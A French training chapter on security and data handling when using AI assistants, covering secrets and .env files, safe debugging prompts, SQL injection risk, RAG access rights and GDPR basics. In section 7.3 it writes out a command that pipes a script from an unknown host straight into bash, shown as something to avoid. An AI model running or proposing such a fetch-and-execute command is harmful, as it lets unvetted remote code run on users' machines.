# Chapitre 2 · Sécurité et données avec l’IA

En introduction, on a vu une idée simple : l’IA **accélère**, mais **ne remplace** ni la **responsabilité** ni le **bon sens** dès qu’il s’agit du **confidentiel**. Ce chapitre pose les **garde-fous** avant d’aller plus loin dans l’éditeur et les prompts : **où partent les données**, **ce qu’il ne faut jamais coller dans un chat**, et **quand dire non** sans ambiguïté.

Dans une **structure** un peu formelle, il y a en général **des rôles** pour ce qui dépasse le clavier.

Le **RSSI** (*responsable de la sécurité des systèmes d’information*, le titre varie) porte surtout les **accès**, les **fuites** et les **outils** sur le réseau. Le **DPO** (*délégué à la protection des données*, *Data Protection Officer*) porte les questions sur les **données personnelles** et le **RGPD**.

Si vous êtes **solo**, en **toute petite équipe** ou en **vibe coding** sans ces gens, **les mêmes risques** restent.

Ce n’est pas une raison d’ignorer le sujet : c’est **à vous** (ou à un **prestataire**, ou à une **question ponctuelle** à un pro) de vous débrouiller. En pratique : lire la **doc du fournisseur** ; regarder la **charte** de votre hébergeur ; ouvrir la **CNIL** dès qu’il y a des **données sur des personnes**.

---

## 1. Ce que vous saurez faire après ce chapitre

À la fin de ces pages, vous devriez pouvoir :

1. **Expliquer à un non-développeur** pourquoi un fichier **`.env`**, une **clé API** ou un **mot de passe** ne doivent **jamais** se retrouver dans **ChatGPT**, Copilot, Cursor ou un fil Slack « pour aller plus vite ».
2. **Lister trois questions** à poser **avant** d’utiliser un outil d’IA sur un sujet sensible : **où vont les données**, **combien de temps sont-elles conservées**, **qui peut les relire** (y compris un sous-traitant hors UE).
3. **Reconnaître des contextes où l’IA est un « non »** (santé, secrets de production, certaines données personnelles, etc.) et **savoir qu’il faut** un arbitrage **métier + juridique + technique**, pas seulement un prompt.
4. **Relire du code généré** sur les zones à risque (SQL, auth, exécution de scripts) avec une **checklist courte**, même si vous n’êtes pas expert sécurité.
5. **Comprendre l’idée générale du RGPD** dans le rapport à l’IA : **minimisation**, **sous-traitance**, **documentation** ; et **où chercher** des repères officiels (CNIL, etc.).

---

## 2. Pourquoi la sécurité passe avant les tutos d’outils

Dans beaucoup de formations « IA dev », on ouvre l’éditeur en premier. Ici, l’ordre est volontaire : **une fois les réflexes de données et de secrets acquis**, vous pourrez utiliser Cursor, les agents ou le Markdown dans le dépôt **sans vous piéger** ni piéger l’équipe.

> **En bref**
>
> Ce chapitre ne remplace **ni** une politique interne **ni** un avis juridique ; il aligne **toute l’équipe** (dev, PO, PM, support) sur les **mêmes interdits** et les **mêmes questions** à poser.

---

## 3. Les règles « ultra basiques », à répéter sans honte

Certaines choses sont du **niveau zéro** de la sécurité ; on les répète parce qu’elles se **violent encore tous les jours** sous la pression du délai.

Les ignorer, ce n’est pas « gagner du temps » : une clé ou un export mal placés peuvent être journalisés, relus ou réutilisés hors de votre contrôle ; vous exposez alors des personnes et l’entreprise à une fuite, une fraude, et au pire à des recours ou une plainte (clients, autorité, partenaires), incomparablement plus lourd que le temps qu’on croyait économiser.

### 3.1. Fichier `.env`, clés, mots de passe : zéro partage dans un chat

- Un fichier **`.env`** (ou équivalent : secrets injectés au **runtime**) contient souvent des **clés d’API**, des **secrets applicatifs**, parfois des URLs internes. **Ce n’est pas un document de travail** à envoyer dans un chat pour « déboguer plus vite ».
- Une **clé API** ou un **token** (Stripe, OpenAI, AWS, clé de signature JWT, etc.), c’est comme une **clé physique** : si quelqu’un d’autre l’a, il peut **agir en votre nom** sur le service concerné.
- **Ne jamais** coller ces valeurs dans **ChatGPT** (interface web grand public), dans un **thread Slack**, dans un **ticket public**, dans une **capture d’écran** partagée, ni dans un **mail** non chiffré, sauf cadre **explicitement** prévu et sécurisé par votre entreprise (coffre-fort de secrets, canal d’incident, etc.).

> **Attention**
>
> **« Privé » ou « conversation confidentielle » sur l’interface ne veut pas dire « invisible côté serveur ni dans les journaux ».** Lisez la **page d’aide** et le **contrat** du **produit que vous payez** (compte entreprise, options « zero retention », région d’hébergement, etc.).

### 3.2. Données sensibles, ChatGPT et autres services généralistes

Par **données sensibles**, pensez au minimum : **données clients** (e-mails, adresses, historique d’achat), **données RH** (entretiens, salaires, absences), **extraits de base de production**, **logs** contenant des jetons ou des identifiants, **pièces d’identité**, **données de santé**, **dossiers juridiques**.

**Règle simple pour les non-devs** : si vous hésiteriez à le mettre sur la **page d’accueil publique** du site, **ne le mettez pas** dans un chat généraliste. Pour du **flou**, demandez à votre **référent** (sécurité, juridique, DPO) **avant** de coller quoi que ce soit.

---

## 4. Où va ce que vous tapez ? Trois familles d’outils

La question n’est pas seulement « est-ce que l’IA répond bien », mais **où part le texte** une fois que vous l’avez envoyé : **même prompt**, selon l’outil, peut finir **traité**, **stocké** ou **lu** dans des conditions **très différentes**. D’où trois grands cas, du plus « grand public » au plus « cadré contrat » :

1. **Navigateur, appli grand public** (ChatGPT dans l’onglet, assistant mobile…) : vous êtes souvent sur l’**infrastructure du fournisseur**. Ce que vous saisissez peut être **journalisé**, **conservé**, **analysé** pour la facturation ou la sécurité du service, selon les **conditions** du produit.
2. **Éditeur ou extension « sur le dépôt »** (Cursor, Copilot, etc.) : en plus du chat, il peut y avoir de l’**indexation** de fichiers, des **suggestions** inline, parfois des **agents** qui lisent plusieurs chemins. Là encore : **lire** ce que dit l’éditeur sur la **télémétrie**, la **rétention**, l’**opt-out** d’entraînement.
3. **Offre « entreprise » ou hébergement dédié** : le **contrat** ou les **options d’achat** peuvent prévoir des **garanties** plus strictes que le compte perso : par exemple **données hébergées dans une région** (souvent l’UE), **durée de conservation** des conversations, **interdiction d’entraîner** le modèle sur vos contenus, **canal support** en cas d’incident. Rien n’est automatique : il faut **savoir ce qui est réellement activé** sur **votre** abonnement et **où** passent encore les données quand vous branchez l’outil au dépôt ou aux tickets.

> **En bref**
>
> Posez-vous : **quel outil**, **quelles données**, **pour quel public** (interne, client, sous-traitant). C’est la même grille que dans l’introduction, mais avec le **casque sécurité** en plus.

---

## 5. Cas pratique : déboguer en local sans vider le terminal ni une ligne du `.env` dans le chat

Le premier cas concret côté **développement**, c’est presque toujours le même : *« Ça plante, je balance la sortie du terminal dans l’assistant pour gagner du temps. »*

**Même famille d’erreur** dans le **chat de l’IDE** (Copilot, Cursor, etc.) : coller une ligne du `.env` « pour que l’IA voie », en pensant que *« c’est sur mon poste, donc ça ne part pas »*.

Tant que le log ne contient que du **code** et des **messages génériques**, le risque reste **modéré**.

Dès qu’y apparaissent une **URL avec jeton**, un **`Authorization`**, une **chaîne de connexion** ou une **variable d’environnement résolue**, vous mettez dans le chat **des secrets** (clés, jetons, mots de passe en clair). Le texte du chat **traverse en général l’infrastructure du fournisseur** de l’outil : conservation possible, journaux, contrôles anti-abus ; ce que l’interface ne montre pas.

À l’écran, ce n’est souvent qu’un **log** ou une **ligne de config** : le secret y est **noyé**, et on oublie de se demander **où** le texte va ensuite. **Conséquence** si la valeur fuit : quelqu’un peut **agir au nom du service** (paiements, appels API, etc.).

### 5.1. Situation

Vous appelez une **API tierce** depuis une route Node (ou équivalent). En local, la réponse est **401 Unauthorized**. Le navigateur ou le client HTTP affiche parfois la **requête rejouée** avec les en-têtes ; votre script de dev peut **logger** la config ou l’URL complète. *(Même logique si vous déboguez une intégration **paiement** : le piège reste « tout coller », pas le métier précis.)*

### 5.2. Mauvais réflexe

**Terminal ou navigateur** : coller dans un chat **grand public** tout le **bloc**, par exemple une ligne `curl` avec `?apiKey=…`, un en-tête `Authorization: Bearer eyJ…`, une trace où le **loader d’environnement** a affiché `DATABASE_URL=postgres://…`, ou un **copier-coller** du `.env` avec les **valeurs**.

**IDE** : coller par exemple `STRIPE_SECRET_KEY=sk_live_…` dans le chat intégré. Le secret **quitte votre machine** comme avec n’importe quel autre assistant connecté.

### 5.3. Ce qu’on fait à la place

- Décrire la **stack** (runtime, lib HTTP, version approximative du SDK) et le **flux** (quelle route appelle quoi).
- Ne transmettre que le **message d’erreur** et le **code HTTP**, plus des **noms** de variables ou d’en-têtes **sans** les valeurs (`Authorization: <omis>`, `API_KEY=<omis>`).
- Si une URL est nécessaire : **hôte + chemin** uniquement, **sans** query string secrète.
- Demander une **piste de diagnostic** (ordre des vérifs, cas fréquents 401), pas une « **recette** » qui repose sur vos **secrets réels**.
- Vérifier que les variables sensibles sont bien chargées **sur l’environnement de déploiement**, et **absentes du dépôt Git** (pas de `.env` versionné).

**Pour les développeurs**, la comparaison utile est celle d’une question sur **Stack Overflow** : on explique le bug, mais on ne colle pas un **endpoint complet** avec ses **query params** sensibles.

**Pour les PO / PM**, pensez plutôt **carte bancaire** : si vous ne mettriez pas la carte en photo dans un ticket, vous n’y mettez pas non plus une **clé**, un **token** ou une **capture** où ils apparaissent.

**Dans le ticket**, on écrit ce que l’utilisateur voit, ce qu’on a fait avant que cela casse, et dans quel contexte cela arrive (**navigateur**, **environnement**, **version** si utile).

**Les valeurs confidentielles**, elles, restent dans les outils prévus pour cela (**coffre**, **variables d’environnement**, **outils internes**).

### 5.4. Formulation type (à adapter)

Exemple de formulation simple pour demander de l’aide sur ce cas.

> **Formulation type**
>
> J’ai une route Node qui appelle une API REST de facturation. En local, j’obtiens une erreur **401** avec un message très générique du fournisseur.
>
> Stack : Node 22, `fetch` natif, clé lue depuis `process.env`. J’ai déjà vérifié que la variable d’environnement est bien présente et que je suis sur le bon environnement.
>
> Peux-tu me proposer un **ordre de vérifications** pour comprendre d’où peut venir ce 401 ? Je veux surtout les causes les plus fréquentes : mauvais en-tête, mauvais type d’authentification, décalage entre environnement de test et production, ou erreur dans la manière de construire la requête.

**À garder hors du chat** : toute **valeur** de clé ou de token, **chaîne de connexion** complète, **JWT**, **cookie de session**, **URL** avec paramètres d’**authentification**.

> **Attention**
>
> Un fichier `.env` **versionné** dans Git (même « par erreur » une minute) reste souvent **récupérable** dans l’historique. Les plateformes proposent aussi du **secret scanning** ; utilisez-le, mais **ne comptez pas** dessus pour annuler une fuite humaine.

---

## 6. Quand l’IA est un non, ou « stop, on cadrage d’abord »

Ce n’est pas une liste juridique exhaustive ; c’est une **culture produit** : certains sujets **ne se traitent pas** « en prompt vite fait » sans **cadre**.

**En général, en entreprise, on met en pause l’IA généraliste** (ou on passe par une **offre dédiée** / **pas d’entraînement** / **hébergement contrôlé**) quand :

- il s’agit de **données de santé** à caractère personnel (hors cadre médical ou sans outil **qualifié** / **contrat** adapté) ;
- il s’agit de **biométrie** ou de **données très sensibles** (l’énumération précise dépend du droit applicable) ;
- il s’agit de **secrets de production** (clés, certificats, chaînes de connexion complètes) ;
- il s’agit de **défense nationale**, **secret d’affaires critique**, **enquêtes couvertes par le secret** : là, la règle est souvent **« interdit par politique interne »**, point ;
- il s’agit de **mineurs** ou de **contextes scolaires** : prudence **maximale** sur ce qui est partagé et **avec quel outil** ;
- il s’agit de **décisions juridiques** ou **conformité** : l’IA peut **aider à structurer** une note, **pas** remplacer un **avis** ou une **validation** professionnels ;
- il s’agit d’**automatisations financières** ou d’**actions irréversibles** sans **garde-fou humain** (virement, suppression de masse, etc.).

> **En bref**
>
> Quand le doute apparaît, la phrase utile est : **« Est-ce qu’un outil grand public a le droit de voir ça, et est-ce que notre contrat le couvre ? »** Si la réponse n’est pas **oui clair**, c’est **non** jusqu’à clarification.

---

## 7. Cas pratique : onboarding B2B bloqué, SQL et assistant

Les produits B2B qui gèrent des **invitations**, des **comptes** et des **organisations** déclenchent souvent, après un clic sur un lien dans un e-mail, des **lectures et écritures en base** (tables du type `invitations`, `users`, `organisations`). Quand le flux **bloque** (erreur générique, code HTTP du type **409** « conflit »), le réflexe est d’ouvrir un assistant pour « corriger le SQL » : c’est **exactement** le moment où se mélangent **données personnelles**, **jetons** encore valides et **raccourcis** de concaténation proposés par le modèle.

### 7.1. Le cas : « le client B2B ne termine pas son onboarding »

Un **admin** client a reçu l’invitation, mais au clic le flux **bloque** (page d’erreur, message générique, code HTTP du genre **409** « conflit », etc.). Vous voulez comprendre **vite** : jeton expiré ? ligne `invitation` absente ? **contrainte d’unicité** sur l’e-mail ou sur le couple organisation / slug ?

**Ce qui est tentant et risqué** : coller dans un assistant **la requête SQL telle qu’exécutée** en recette, avec les **vraies adresses e-mail**, le **nom de l’entreprise**, une **ligne complète** exportée de la base, ou pire le **lien d’invitation** encore valide avec son **token**. Vous mélangez alors **données personnelles**, **secrets de session** et **outil grand public** ; et si vous demandez « corrige ma requête », le modèle peut vous renvoyer du SQL qui **concatène** encore l’e-mail ou un slug dans la chaîne : c’est le **même mécanisme** qu’une **injection SQL** (du **texte** finit **à l’intérieur** de la phrase SQL **sans** passer par un mécanisme sûr), que la valeur vienne d’un formulaire ou d’une variable de débogage.

**Rappel simple** : préférez les **requêtes paramétrées** ou un **ORM** bien utilisé.

L’idée est la suivante : la requête SQL reste **fixe**, et la valeur (e-mail, slug, identifiant) est envoyée **séparément**.

À l’inverse, il ne faut pas **fabriquer** la requête en collant directement la valeur dedans à la main.

> **En bref**
>
> **Guillemets** qui **ferment** la requête autour d’une variable (e-mail, slug, paramètre d’URL) → **drapeau rouge**, même « pour débuguer une fois ». Faites relire par quelqu’un qui maîtrise le **couche d’accès aux données** du projet.

### 7.2. Formulation sans fuite, autre angle sur l’onboarding

Même situation, mais vous **n’exportez rien** de sensible : vous décrivez le **schéma** au niveau « noms de tables / colonnes utiles », le **comportement** et le **code HTTP**, et vous demandez une **stratégie de diagnostic**, pas une requête pleine de literals.

> **Formulation type**
>
> Je débugue un flux d’onboarding B2B après clic sur un lien d’invitation reçu par e-mail. Stack : PostgreSQL + ORM côté API.
>
> Après le clic, l’API renvoie **409** avec un message générique côté front. Je cherche surtout à comprendre dans quel ordre vérifier les causes probables.
>
> Côté données, j’ai principalement une table `invitations` (`token`, `expires_at`, `accepted_at`) et une table `users` (`email`, `organisation_id`).
>
> Mes hypothèses : jeton expiré, invitation déjà consommée, ligne manquante côté `invitations`, ou conflit d’unicité sur `email` ou sur `(organisation_id, slug)`.
>
> Peux-tu me proposer une méthode de debug pas à pas : quels checks faire d’abord dans l’ORM ou la base, quels logs regarder, et quels raccourcis SQL il faut éviter pendant l’analyse ?

### 7.3. Scripts et commandes « trouvés sur le chat »

Hors SQL, le même réflexe vaut pour une ligne du type :

```bash
curl https://exemple-inconnu.fr/install.sh | bash
```

**Règle** : ne pas exécuter si vous ne connaissez **pas** l’éditeur et le **contenu** du script. Comparez l’URL à la **doc officielle** **caractère par caractère** (homoglyphes, domaines voisins).

**Pour les PO / PM** : vous pouvez exiger qu’aucun script d’installation ne vienne d’une URL **hors liste blanche** validée par l’équipe infra.

---

## 8. Documentation interne, RAG et ACL

Beaucoup d’équipes branchent un **moteur de questions** sur une **base documentaire** interne. Le principe (souvent appelé **RAG**, *retrieval-augmented generation*) est simple : au lieu de répondre “de mémoire”, l’outil va **chercher des extraits** dans des documents, puis s’en sert pour formuler sa réponse.

**Cas pratiques fréquents** :

- poser des questions sur un **wiki interne** ou un **centre d’aide** ;
- retrouver une **procédure** (onboarding client, support, déploiement, RH) ;
- interroger un lot de **PDF**, de pages **Notion / Confluence / SharePoint** ou de documents dans **Google Drive** ;
- fabriquer un petit **assistant documentaire** pour une équipe support, ops ou produit.

**Côté outils**, cela peut prendre plusieurs formes : un moteur de recherche documentaire, un plugin branché sur votre wiki, un assistant connecté à des fichiers, ou un montage plus technique avec indexation + base vectorielle + LLM. Le nom change selon les produits ; l’idée reste la même.

**Côté accès**, certaines équipes veulent aussi que l’outil respecte les **droits de lecture** déjà présents dans la source. Selon les plateformes, cela peut s’appeler **permissions**, **partage**, **droits d’accès** ou **ACL** (*Access Control List*).

En pratique, la question utile est simple : *« Si une page est réservée à un groupe, est-ce que l’assistant la cache aussi aux autres ? »*

> **En bref**
>
> Un moteur RAG peut être très pratique sur de la **documentation interne**, mais il faut penser en même temps à la **qualité des sources** et aux **droits d’accès**.

Pour une vue d’ensemble assez simple, vous pouvez parcourir le [Guide de la génération augmentée par récupération (RAG) de la DGE](https://www.entreprises.gouv.fr/files/files/Publications/2024/Guides/20241127-bro-guide-ragv4-interactif.pdf).

---

## 9. Apparté RGPD Europe : ce que l’IA change, ou pas

Le **RGPD** concerne les **données personnelles**. Donc, dès qu’un prompt, un fichier ou un log contient des informations sur une **personne physique** (nom, e-mail, téléphone, historique, dossier RH, support client, etc.), le sujet ne relève plus seulement de la “bonne pratique sécurité” : il entre aussi dans un **cadre légal**.

Pourquoi c’est important ici ? Parce qu’un outil d’IA ne “fait pas disparaître” la règle. Si vous copiez un ticket support, un export CRM ou un échange client dans un assistant, vous êtes quand même en train de **traiter des données personnelles**. Le fait que ce soit “juste pour résumer”, “juste pour reformuler” ou “juste pour aller plus vite” ne change pas le fond du sujet.

Concrètement, cela implique au minimum quatre réflexes.

**1. Envoyer moins**

Il faut d’abord se demander si vous avez vraiment besoin d’envoyer la donnée telle quelle. Très souvent, non. On peut décrire un cas, anonymiser un exemple, ou ne garder que les éléments utiles à la tâche. C’est l’idée de **minimisation** : ne pas envoyer “tout le dossier au cas où”.

**2. Savoir sur quelle base on le fait**

Si vous traitez des données de personnes, il faut en général pouvoir expliquer **pourquoi** vous le faites et dans quel **cadre**. Selon les cas, cela peut relever d’un contrat, d’une obligation, d’un intérêt légitime, ou d’une autre base prévue par le droit. Ce n’est pas une formalité décorative : si personne dans l’équipe ne sait expliquer pourquoi ces données partent dans tel outil, c’est déjà un signal d’alerte.

**3. Regarder qui reçoit les données**

Avec un outil d’IA externe, un fournisseur intervient souvent dans le traitement. Cela veut dire qu’il faut regarder les **conditions**, la **région d’hébergement**, le **DPA** (*Data Processing Agreement*), et plus largement ce que votre organisation a validé ou non. Là encore, la question n’est pas théorique : si l’outil envoie les données hors de votre périmètre habituel, il faut le savoir avant, pas après.

**4. Vérifier combien de temps cela reste**

Un chat, un log ou un historique peut être **conservé**. Ce point compte, car une donnée personnelle qui reste stockée plus longtemps que prévu reste aussi un risque plus longtemps. C’est donc une vraie question d’achat et de configuration : combien de temps les conversations sont-elles gardées, peut-on limiter cette conservation, et qui peut y accéder ?

En une phrase : avec le **RGPD**, la question n’est pas seulement *« est-ce que l’outil est pratique ? »* mais aussi *« ai-je le droit d’envoyer cela, à ce prestataire, dans ces conditions, et pour combien de temps ? »*

> **Attention**
>
> Ce chapitre donne des **repères généraux**. Il ne remplace pas un **avis juridique**, ni une **vérification de conformité** adaptée à votre organisation, à vos données et à l’outil choisi.

---

## 10. Contenu public, sites et landing : promesses

Évitez les formules **invérifiables** (« chiffrement militaire », « 100 % inviolable ») si vous ne pouvez pas les **soutenir** avec des éléments sérieux (audit, architecture documentée, périmètre précis). C’est un risque **juridique** et de **confiance**.

Préférez des **faits** : « HTTPS », « hébergement UE », « politique de rétention documentée », **si c’est vrai**.

---

## 11. Où lire sans se faire arnaquer, côté documentation sérieuse

Les **bons cours** renvoient vers des **sources éditées** plutôt que vers le premier blog venu. Gardez l’habitude : pour la **sécurité**, la **vie privée** ou les **API**, ouvrez d’abord le site de **l’éditeur** ou d’une **autorité reconnue**.

> **Prudence**
>
> Les liens ci-dessous pointent vers des **organismes ou éditeurs** souvent utilisés en entreprise ; vérifiez toujours que l’URL affichée dans le navigateur correspond bien au domaine attendu (hameçonnage par **homoglyphes**).

| Besoin | Plutôt que… | Piste sérieuse |
|--------|-------------|----------------|
| Risques **applications LLM** | Un thread Reddit anonyme | [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) |
| Risques **web classiques** | Un tuto « top 10 hacks » | [OWASP Top 10 (web)](https://owasp.org/www-project-top-ten/) |
| **Cadre** risque IA (organisation) | Un PDF marketing | [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework) |
| **Données perso & IA** (France) | ChatGPT pour « résumer le RGPD » | [CNIL : intelligence artificielle](https://www.cnil.fr/fr/intelligence-artificielle) |
| **Secrets sur GitHub** | « On efface la branche » | [GitHub : secret scanning](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning) |
| **Cadre européen** sur l’IA | Un post LinkedIn sûr de lui | [Commission européenne : AI Act](https://digital-strategy.ec.europa.eu/en/policies/regulatory-framework-ai) |
| **Politique entreprise** d’un fournisseur IA | Une capture d’écran repostée | [OpenAI : Enterprise privacy](https://openai.com/enterprise-privacy/) |
| **Politique de confidentialité** d’un fournisseur IA | Un thread X / Twitter | [Anthropic : Privacy policy](https://www.anthropic.com/legal/privacy) |
| **Doc officielle** sur un assistant de code | Un comparatif SEO douteux | [GitHub Copilot documentation](https://docs.github.com/en/copilot) |
| **Doc officielle** sur votre éditeur | « On m’a dit que… » | [Cursor documentation](https://cursor.com/docs) |

---

## 12. Feuille d’équipe à dupliquer

À reprendre dans votre wiki ou Notion interne, puis à **compléter en équipe** :

### Outils d’IA autorisés

- Outils validés pour l’équipe :
- Compte perso autorisé ou non :
- Usages permis (chat, génération de code, résumé de docs, support, etc.) :

### Ce qu’on ne met jamais dans un prompt

- Ex. `.env`, clés, tokens, exports CRM, données RH, santé, prod clients :
- Dépôts ou dossiers explicitement interdits :

### Où vivent les secrets

- Variables d’environnement :
- Coffre / Vault / hébergeur :
- Qui a le droit d’y accéder :

### Qui relit les zones sensibles

- Paiement :
- Auth :
- SQL :
- Scripts et téléchargements :

### Que faire si une clé fuite

- Qui prévenir en premier :
- Quoi révoquer / faire tourner tout de suite :
- Où documenter l’incident :

---

## 13. Erreurs fréquentes

- Croire que **« conversation privée »** = **données inexistantes côté fournisseur** sans lire les conditions.
- Coller un **`.env`**, un **JWT**, un **export CSV client** dans **ChatGPT** « juste pour reformuler ».
- **Accepter** un gros diff sans regarder **paiement**, **auth**, **SQL**, **téléchargements**.
- **Indexer** toute la doc interne **sans** alignement sur les **droits de lecture**.
- Promettre sur le site une **sécurité** ou une **conformité** non **prouvée**.

---

## 14. Checklist de fin de chapitre

- [ ] Je peux expliquer **sans jargon** pourquoi le **`.env`** et les **clés** ne vont pas dans un chat générique.
- [ ] Je sais **qui contacter** en interne quand un collègue veut coller des **données clients** dans un assistant.
- [ ] Je peux citer **deux cas** où l’IA est un **non** jusqu’à cadrage.
- [ ] Je comprends **minimisation** et **sous-traitance** en une phrase chacune.
- [ ] J’ai ouvert **au moins un** lien de la section 11.

---

## Mini-glossaire du chapitre 2

| Terme | Sens ici |
|-------|----------|
| **`.env`** | Fichier (ou équivalent) listant des **variables** lues au lancement de l’app, souvent **secrètes** : **ne pas** le partager, **ne pas** le versionner dans Git en clair. |
| **Secret / clé** | Valeur qui **prouve une identité** ou **déverrouille** un service (API key, token, mot de passe applicatif). |
| **Données personnelles** | Données identifiant une **personne physique** (selon définition légale) ; régime **RGPD** en Europe si vous traitez des personnes concernées. |
| **Sous-traitance** | Un prestataire (ex. hébergeur d’outil IA) **traite** des données **pour** votre organisation ou en parallèle : **contrats** et **documentation** à prévoir. |
| **Injection** | Du texte utilisateur devient **code** ou **requête** : risque classique sur SQL et certaines APIs. |
| **ACL** | *Access Control List* : **qui** a le droit de **lire quoi** ; le moteur sur la doc doit **respecter** les mêmes règles que la source. |
| **RAG** | *Retrieval-augmented generation* : récupérer des **extraits** de documents puis les passer au modèle ; le **risque d’accès** est traité ici, le détail méthodo **plus loin** dans le parcours. |
| **DPA** | *Data Processing Agreement* : accord de **traitement des données** entre responsable et sous-traitant (souvent hors de ce cours, côté juridique). |
| **RSSI** | *Responsable de la sécurité des systèmes d’information* : **référent** côté organisation pour la **politique de sécurité** (accès, outils, incidents). |
| **DPO** | *Data Protection Officer* / **délégué à la protection des données** : **référent RGPD** pour conseiller sur les traitements de **données personnelles** et l’articulation avec les autorités. |

---

## À retenir en une phrase

**Avant** d’optimiser vos prompts, verrouillez **ce qui ne doit jamais quitter votre périmètre** (`.env`, clés, données sensibles) et **posez les questions** (outil, conservation, droits) : le reste du parcours suppose que ce socle est **partagé** par toute l’équipe.
